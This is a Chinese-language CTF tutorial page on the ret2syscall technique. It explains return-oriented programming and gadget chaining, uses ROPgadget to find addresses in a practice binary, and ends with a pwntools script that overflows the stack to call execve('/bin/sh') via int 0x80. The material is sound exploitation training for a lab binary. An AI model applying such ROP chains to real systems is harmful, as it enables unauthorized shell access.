<template><div><h1 id="_05-ret2syscall" tabindex="-1"><a class="header-anchor" href="#_05-ret2syscall" aria-hidden="true">#</a> 05.ret2syscall</h1>
<p><a name="19478086"></a></p>
<h2 id="rop原理" tabindex="-1"><a class="header-anchor" href="#rop原理" aria-hidden="true">#</a> ROP原理：</h2>
<p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p>
<p><a name="b7d7d9a8"></a></p>
<h3 id="gadget" tabindex="-1"><a class="header-anchor" href="#gadget" aria-hidden="true">#</a> gadget：</h3>
<p>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
<p>例如：<code v-pre>pop eax ; ret</code></p>
<p>这段代码的作用就是将栈顶的数据弹出给eax，然后再将栈顶的数据作为返回地址返回。</p>
<p>假如我们通过栈溢出将eip覆盖为pop eax的地址，当程序返回的时候就会执行pop eax，将'aaaa'放到eax中，然后执行ret指令，将'bbbb'放入eip寄存器中，然后会执行地址为'bbbb'处的指令，可以看到，bbbb处的指令为xxxx，当执行完xxxx后，继续执行ret指令，然后会返回到cccc指令处，执行xxxx。system函数的本质也是一条条汇编指令的组合，如果我们能找到多个xxxx，ret结构的指令，将其连接在一起，就可以达到执行system函数的效果。</p>
<p><img src="https://img-blog.csdnimg.cn/235ef4c7db3c424e9d502314c10d7597.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=CmacD&amp;originHeight=641&amp;originWidth=857&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></p>
<p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序，我们可以将多个gadget组合到一起，进而可以执行多条汇编指令，从而达到目的。ROP 攻击一般得满足如下条件</p>
<ul>
<li>程序存在溢出，并且可以控制返回地址。</li>
<li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li>
</ul>
<p><a name="7ca4fde4"></a></p>
<h2 id="例题" tabindex="-1"><a class="header-anchor" href="#例题" aria-hidden="true">#</a> 例题：</h2>
<p>ret2syscall，即通过ROP控制程序执行系统调用，获取 shell。</p>
<p><a name="562b019f"></a></p>
<h3 id="首先checksec" tabindex="-1"><a class="header-anchor" href="#首先checksec" aria-hidden="true">#</a> 首先checksec：</h3>
<p><img src="https://img-blog.csdnimg.cn/2021022122125167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=sbSJv&amp;originHeight=216&amp;originWidth=1003&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></p>
<p>32位程序，开启了堆栈不可执行。</p>
<p><a name="f12d506c"></a></p>
<h3 id="ida分析" tabindex="-1"><a class="header-anchor" href="#ida分析" aria-hidden="true">#</a> ida分析：</h3>
<p><img src="https://img-blog.csdnimg.cn/20210221221334617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=Tlpr6&amp;originHeight=246&amp;originWidth=695&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></p>
<p>依旧是栈溢出，只不过不存在后门函数，且开启了nx保护，考虑使用ROP来执行系统调用。</p>
<p><a name="7ac74a4c"></a></p>
<h3 id="关于系统调用的知识" tabindex="-1"><a class="header-anchor" href="#关于系统调用的知识" aria-hidden="true">#</a> 关于系统调用的知识：</h3>
<p><strong>Linux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数</strong></p>
<p><strong>应用程序调用系统调用的过程是：</strong></p>
<p>1、<strong>把系统调用的编号存入 EAX</strong></p>
<p>2、<strong>把函数参数存入其它通用寄存器</strong></p>
<p>3、<strong>触发 0x80 号中断（int 0x80）</strong></p>
<p>那么我们如果希望通过系统调用来获取 shell 就需要把系统调用的参数放入各个寄存器，然后执行 int 0x80 指令就可以了。</p>
<p><a name="c3e4a8eb"></a></p>
<h3 id="本题思路" tabindex="-1"><a class="header-anchor" href="#本题思路" aria-hidden="true">#</a> 本题思路</h3>
<p>想通过系统调用执行：<code v-pre>execve(&quot;/bin/sh&quot;,NULL,NULL)</code>（32位程序）</p>
<p>那么 eax 寄存器应该放系统调用号，查看 execve 的系统调用号：</p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code> cat /usr/include/asm/unistd_32.h | grep execve
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="https://img-blog.csdnimg.cn/20210221221419364.png#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=PcEwD&amp;originHeight=119&amp;originWidth=579&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></p>
<p>得到 11，转换为 16 进制是 0xb，所以 eax 中应该存放 0xb。</p>
<p>ebx 应该存放想要执行的 /bin/sh 的地址，还有两个参数设置为 0。</p>
<p>所以现在需要做的就是让：</p>
<ol>
<li>eax=0xb</li>
<li>ebx=/bin/sh 的地址</li>
<li>ecx=0</li>
<li>edx=0</li>
</ol>
<p>要让栈顶的值是 0xb 然后可以通过 pop eax 达到目的</p>
<p>用ROPgadget来查找相应的gadget，命令如下：</p>
<p><code v-pre>ROPgadget --binary rop --only 'pop|ret' | grep 'eax'</code></p>
<p><img src="https://img-blog.csdnimg.cn/20210221221548702.png#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=YwHq7&amp;originHeight=184&amp;originWidth=1025&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></p>
<p>可以看到地址为：0x080bb196</p>
<p>类似的，通过这条命令寻找控制其他寄存器的地址，我们发现0x0806eb90位置存在一个gadget可以控制ebx，ecx，edx寄存器，所以我们选择这一条。</p>
<p><img src="https://img-blog.csdnimg.cn/20210221221607494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=FFySo&amp;originHeight=738&amp;originWidth=1031&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></p>
<p>同时使用：<code v-pre>ROPgadget --binary rop --string '/bin/sh'</code> 找到 '/bin/sh' 字符串在什么地方</p>
<p><img src="https://img-blog.csdnimg.cn/20210221221624306.png#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=nTAFz&amp;originHeight=148&amp;originWidth=1000&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></p>
<p>以及需要的 int 0x80：<code v-pre>ROPgadget --binary rop --only 'int'</code></p>
<p><img src="https://img-blog.csdnimg.cn/20210221221643242.png#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=c2Vhd&amp;originHeight=188&amp;originWidth=1024&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></p>
<p>确定偏移的长度为112.</p>
<p><a name="5af9901f"></a></p>
<h3 id="执行过程" tabindex="-1"><a class="header-anchor" href="#执行过程" aria-hidden="true">#</a> 执行过程：</h3>
<p><img src="https://img-blog.csdnimg.cn/20210221221655167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=Xs5qo&amp;originHeight=615&amp;originWidth=937&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></p>
<p><a name="68333f9d"></a></p>
<h3 id="编写exp" tabindex="-1"><a class="header-anchor" href="#编写exp" aria-hidden="true">#</a> 编写exp：</h3>
<div class="language-python ext-py line-numbers-mode"><pre v-pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./rop'</span><span class="token punctuation">)</span>
int_addr<span class="token operator">=</span><span class="token number">0x8049421</span>
bin_sh_addr<span class="token operator">=</span><span class="token number">0x80be408</span>
pop_other_ret<span class="token operator">=</span><span class="token number">0x806eb90</span>
pop_eax_ret<span class="token operator">=</span><span class="token number">0x80bb196</span>
payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">112</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_eax_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_other_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>int_addr<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></div></template>


